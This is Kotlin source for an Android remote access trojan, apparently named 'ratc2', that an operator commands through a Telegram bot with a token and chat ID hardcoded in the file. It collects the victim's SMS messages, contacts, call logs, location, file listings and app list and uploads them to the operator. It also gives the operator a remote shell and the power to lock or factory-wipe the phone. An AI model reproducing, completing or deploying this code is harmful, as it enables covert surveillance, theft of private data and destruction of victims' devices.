package com.spud.ratc2

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder

class Dispatcher(private val ctx: Context) {

    private val BOT = "8873170295:AAHX-1ddnEn3iBzwcWRFHyABrbzRV0xUCMU"
    private val MY_CHAT = "8868615222"
    private val BASE = "https://api.telegram.org/bot$BOT"
    private val c = Collectors(ctx)
    @Volatile private var offset = 0L

    fun loop() {
        while (true) {
            try { tick() } catch (e: Exception) { Thread.sleep(3000) }
        }
    }

    private fun tick() {
        val body = Sender.get("$BASE/getUpdates?offset=$offset&timeout=25")
        val root = JSONObject(body)
        if (!root.optBoolean("ok")) return
        val arr = root.optJSONArray("result") ?: return
        for (i in 0 until arr.length()) {
            val u = arr.getJSONObject(i)
            offset = u.getLong("update_id") + 1
            val cb = u.optJSONObject("callback_query")
            if (cb != null) {
                val chatId = cb.getJSONObject("message").getJSONObject("chat").getString("id")
                val data = cb.optString("data", "")
                val cbId = cb.getString("id")
                answer(cbId)
                if (chatId == MY_CHAT) {
                    sendFileFor(chatId, data)
                    menu(chatId)
                }
                continue
            }
            val m = u.optJSONObject("message") ?: continue
            val chatId = m.getJSONObject("chat").getString("id")
            val text = m.optString("text", "")
            if (text.isBlank() || chatId != MY_CHAT) continue
            if (text.startsWith("/start") || text.startsWith("/help")) menu(chatId)
            else if (text.startsWith("/shell ")) {
                val out = shell(text.removePrefix("/shell "))
                Sender.sendDocument(BASE, chatId, "shell_out.txt", out)
            } else {
                send(chatId, "استخدم /start")
            }
        }
    }

    private fun sendFileFor(chatId: String, data: String) {
        when (data) {
            "device"    -> file(chatId, "device.txt", c.deviceInfo())
            "battery"   -> file(chatId, "battery.txt", c.batteryInfo())
            "storage"   -> file(chatId, "storage.txt", c.storageInfo())
            "location"  -> file(chatId, "location.txt", c.location())
            "sms"       -> file(chatId, "sms_10.txt", c.sms(10))
            "sms50"     -> file(chatId, "sms_50.txt", c.sms(50))
            "contacts"  -> file(chatId, "contacts_20.txt", c.contacts(20))
            "contacts50"-> file(chatId, "contacts_50.txt", c.contacts(50))
            "calls"     -> file(chatId, "calls_10.txt", c.calls(10))
            "calls50"   -> file(chatId, "calls_50.txt", c.calls(50))
            "files"     -> file(chatId, "sdcard.txt", c.files("/sdcard"))
            "downloads" -> file(chatId, "downloads.txt", c.files("/sdcard/Download"))
            "apps"      -> file(chatId, "apps.txt", c.apps())
            "lock"      -> lock(chatId)
            "wipe"      -> wipe(chatId)
            "menu"      -> {}
            else        -> send(chatId, "زر غير معروف: $data")
        }
    }

    private fun file(chatId: String, name: String, content: String) {
        Sender.sendDocument(BASE, chatId, name, content)
        send(chatId, "📎 $name")
    }

    private fun lock(chatId: String) {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val a = ComponentName(ctx, MyAdmin::class.java)
            if (!dpm.isAdminActive(a)) { send(chatId, "❌ التطبيق مو مشرف"); return }
            dpm.lockNow()
            send(chatId, "🔒 تم القفل")
        } catch (e: Exception) { send(chatId, "خطأ: ${e.message}") }
    }

    private fun wipe(chatId: String) {
        try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val a = ComponentName(ctx, MyAdmin::class.java)
            if (!dpm.isAdminActive(a)) { send(chatId, "❌ التطبيق مو مشرف"); return }
            dpm.wipeData(0)
        } catch (e: Exception) { send(chatId, "خطأ: ${e.message}") }
    }

    private fun shell(cmd: String): String = try {
        val p = ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start()
        val out = p.inputStream.bufferedReader().readText()
        p.waitFor()
        out.ifBlank { "(مافي ناتج)" }
    } catch (e: Exception) { "خطأ: ${e.message}" }

    private fun send(chatId: String, text: String) {
        try {
            val p = "chat_id=$chatId&text=" + URLEncoder.encode(text, "UTF-8")
            Sender.post("$BASE/sendMessage", p)
        } catch (_: Exception) {}
    }

    private fun menu(chatId: String) {
        val kb = JSONArray().apply {
            put(JSONArray().apply { put(b("📱 جهاز", "device")); put(b("🔋 بطارية", "battery")) })
            put(JSONArray().apply { put(b("💾 ذاكرة", "storage")); put(b("📍 موقع", "location")) })
            put(JSONArray().apply { put(b("💬 آخر 10 SMS", "sms")); put(b("💬 آخر 50 SMS", "sms50")) })
            put(JSONArray().apply { put(b("👥 20 جهة", "contacts")); put(b("👥 50 جهة", "contacts50")) })
            put(JSONArray().apply { put(b("📞 10 مكالمات", "calls")); put(b("📞 50 مكالمة", "calls50")) })
            put(JSONArray().apply { put(b("📂 /sdcard", "files")); put(b("📁 التنزيلات", "downloads")) })
            put(JSONArray().apply { put(b("📦 تطبيقات", "apps")); put(b("🔒 قفل", "lock")) })
            put(JSONArray().apply { put(b("🗑️ تنسيق", "wipe")) })
        }
        val mk = JSONObject().put("inline_keyboard", kb)
        val p = "chat_id=$chatId&text=" + URLEncoder.encode("🎛️ لوحة التحكم", "UTF-8") +
                "&reply_markup=" + URLEncoder.encode(mk.toString(), "UTF-8")
        try { Sender.post("$BASE/sendMessage", p) } catch (_: Exception) {}
    }

    private fun b(t: String, d: String) = JSONObject().put("text", t).put("callback_data", d)

    private fun answer(id: String) {
        try { Sender.post("$BASE/answerCallbackQuery", "callback_query_id=$id") } catch (_: Exception) {}
    }
}
